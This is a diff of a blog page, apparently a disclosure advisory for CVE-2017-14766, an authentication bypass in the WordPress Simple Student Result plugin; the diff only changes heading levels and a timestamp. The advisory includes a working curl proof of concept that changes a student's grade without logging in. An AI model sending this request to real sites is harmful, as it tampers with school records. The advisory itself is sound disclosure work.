@@ -208,21 +208,21 @@ Software Link: https://wordpress.org/plugins/simple-student-result/<br>
 Version: &lt; 1.6.4<br>
 Tested on: Kali Linux 2.0<br>
 CVE : CVE-2017-14766  </p>
-<h1>1. Product &amp; Service Introduction:</h1>
+<h2>1. Product &amp; Service Introduction:</h2>
 <p>Simple Student Result is a Wordpress plugin for managing student results. Administrators can create/update/delete results while unauthenticated users can lookup results by providing a student id number. As of now, the plugin has been downloaded 12,000 times and has 700+ active installs.  </p>
-<h1>2. Technical Details &amp; Description:</h1>
+<h2>2. Technical Details &amp; Description:</h2>
 <p>Authentication Bypass vulnerability in the Wordpress Simple Student Result plugin 1.6.3 allows unauthenticated attackers to update or delete student records with knowledge of only the student id number. The fn_ssr_add_st_submit() function and fn_ssr_del_st_submit() function in functions.php did not check if the current request is made by an authorized user, thus allowing any unauthenticated user to modify the records.</p>
-<h1>3. Proof of Concept (PoC):</h1>
+<h2>3. Proof of Concept (PoC):</h2>
 <p>To update student id 123's CGPA to 5.0: <br>
 <code>curl -i -s -k  -X 'POST' -H 'User-Agent: Mozilla/5.0' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://localhost/wp-admin/admin.php?page=ssr_add_results' --data-binary 'action=ssr_add_st_submit&amp;rid=123&amp;rn=456&amp;stn=john&amp;stfn=smith&amp;stpy=2017&amp;stcgpa=5.00&amp;stsub=Subject+3&amp;stpy2=01011990&amp;stpy3=male&amp;stpy4=address&amp;stpy5=smith&amp;stpy6=extra1&amp;stpy7=extra2&amp;upload_image=' 'https://localhost/wp-admin/admin-ajax.php'</code></p>
-<h1>4. Mitigation</h1>
+<h2>4. Mitigation</h2>
 <p>Update to version 1.6.4  </p>
-<h1>5. Disclosure Timeline</h1>
+<h2>5. Disclosure Timeline</h2>
 <p>2017/09/20 Vendor contacted<br>
 2017/09/20 Vendor responded<br>
 2017/09/21 Update released<br>
 2017/09/21 Advisory released to the public  </p>
-<h1>6. Credits &amp; Authors:</h1>
+<h2>6. Credits &amp; Authors:</h2>
 <p>Benjamin Lim - [https://limbenjamin.com]  </p>
       </div><!-- .entry-content -->
       <br /><br />
@@ -279,7 +279,7 @@ CVE : CVE-2017-14766  </p>
                     <a href="../feeds/all.atom.xml">Atom Feed</a> | 
                     <a href="../sitemap.xml">Sitemap</a><br />
                     This site uses the <a href="https://github.com/limbenjamin/voce">voce</a> theme by <a href="//limbenjamin.com/">Benjamin Lim</a><br />
-                    Page generated on Sat Mar  7 22:43:40 2026<br />
+                    Page generated on Sun Mar  8 09:03:56 2026<br />
                     &copy; 2012-2026 <a href="..">Benjamin Lim</a> </div>
         </div>
       </div><!-- .site-info -->
